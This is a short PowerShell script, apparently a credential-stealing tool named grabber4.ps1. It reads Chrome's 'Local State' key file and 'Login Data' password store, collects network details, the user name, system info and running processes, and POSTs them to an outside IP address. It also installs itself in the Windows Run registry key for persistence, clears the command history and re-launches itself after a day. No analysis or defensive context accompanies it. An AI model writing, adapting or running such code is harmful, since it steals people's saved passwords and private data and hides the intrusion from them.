$var += cat "Local State"

cd Default

$var += cat "Login Data"

$var += Get-NetIPConfiguration 

$var += whoami

$var += Get-ComputerInfo

$var += Get-Date

$var += ps 
Start-Sleep -Seconds 3

#start http post 

#httpsend

    $Response = Invoke-WebRequest -Method Post -URI http://192.168.0.107:80 -body $var -UseBasicParsing

#set per

New-ItemProperty -Path "Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "grabber4.ps1" `
    -Value "%LOCALAPPDATA%\Google\Chrome\User Data\grabber4.ps1 -autostart"

cd..

Clear-History

start-sleep 86400

./grabber4.ps1
